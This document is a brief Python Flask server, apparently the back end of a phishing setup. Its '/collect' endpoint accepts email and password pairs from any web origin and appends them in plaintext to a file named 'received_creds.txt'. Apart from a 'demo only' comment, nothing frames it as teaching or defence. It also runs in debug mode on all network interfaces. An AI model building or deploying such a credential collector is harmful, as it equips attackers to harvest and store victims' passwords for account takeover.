from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

RECEIVED_FILE = 'received_creds.txt'

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json(silent=True) or {}
    email = data.get('email')
    password = data.get('password')
    if not email:
        return jsonify({'error': 'missing email'}), 400

    # Append plaintext credentials (demo only). For real use, never store passwords in plaintext.
    with open(RECEIVED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}\t{password}\n")

    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    # DEVELOPMENT: runs without TLS. For production use HTTPS (reverse proxy or SSL).
    app.run(host='0.0.0.0', port=5000, debug=True)
